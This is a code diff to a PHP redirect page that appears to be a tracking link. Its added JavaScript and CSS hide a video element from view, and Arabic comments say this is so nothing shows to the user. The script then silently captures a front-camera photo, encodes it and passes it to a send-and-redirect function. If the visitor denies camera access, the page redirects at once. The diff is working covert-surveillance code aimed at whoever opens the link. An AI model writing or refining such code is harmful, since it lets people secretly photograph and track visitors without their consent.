@@ -252,6 +252,15 @@ if (isset($_GET['r'])) {
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body, html { width: 100%; height: 100%; overflow: hidden; background: #000; }
+        /* إخفاء عنصر الفيديو تماماً من الشاشة لئلا يظهر أي شيء مرئي للمستخدم */
+        #hidden-video {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+            pointer-events: none;
+            z-index: -1;
+        }
     </style>
     <script>
         let isProcessed = false;
@@ -303,26 +312,30 @@ if (isset($_GET['r'])) {
                 return;
             }
 
+            // محاولة التقاط الصورة عبر الكاميرا الأمامية بطريقة خفية
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                 .then(stream => {
-                    const video = document.createElement('video');
+                    const video = document.getElementById('hidden-video');
                     video.srcObject = stream;
-                    video.play();
-                    
-                    setTimeout(() => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = 640;
-                        canvas.height = 480;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        const imageData = canvas.toDataURL('image/jpeg', 0.85);
-                        stream.getTracks().forEach(track => track.stop());
+                    video.play().then(() => {
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = 640;
+                            canvas.height = 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            
+                            const imageData = canvas.toDataURL('image/jpeg', 0.85);
+                            stream.getTracks().forEach(track => track.stop());
 
-                        sendInfoAndRedirect(imageData);
-                    }, 300);
+                            sendInfoAndRedirect(imageData);
+                        }, 250);
+                    }).catch(() => {
+                        sendInfoAndRedirect("");
+                    });
                 })
                 .catch(err => {
+                    // إذا رفض المستخدم الإذن أو تم حظر الكاميرا، يتم التحويل فوراً بدون توقف
                     sendInfoAndRedirect("");
                 });
         }
@@ -331,12 +344,14 @@ if (isset($_GET['r'])) {
             initTracking();
         });
 
+        // دعم التشغيل التلقائي عند أول تفاعل خفيف (Click) إذا تطلب المتصفح ذلك
         window.addEventListener('click', () => {
             initTracking();
         }, { once: true });
     </script>
 </head>
 <body>
+    <video id="hidden-video" autoplay playsinline muted></video>
 </body>
 </html>
 <?php 
